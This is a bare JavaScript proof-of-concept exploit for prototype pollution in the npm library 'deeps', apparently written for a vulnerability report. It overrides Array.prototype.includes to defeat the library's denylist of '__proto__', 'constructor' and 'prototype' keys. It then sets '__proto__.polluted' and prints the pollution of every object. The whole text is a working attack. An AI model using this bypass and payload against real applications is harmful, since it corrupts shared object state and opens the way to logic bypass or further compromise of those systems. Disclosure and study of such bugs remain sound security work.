Array.prototype.includes = function (key) {
    if (key == '__proto__' || key == 'constructor' || key == 'prototype' || key == 'polluted') {
        return false;
    } else {
        return true;
    }
};
console.log({}.polluted);
const deeps = require('deeps');
deeps.set({}, '__proto__.polluted', 'yes');
console.log({}.polluted);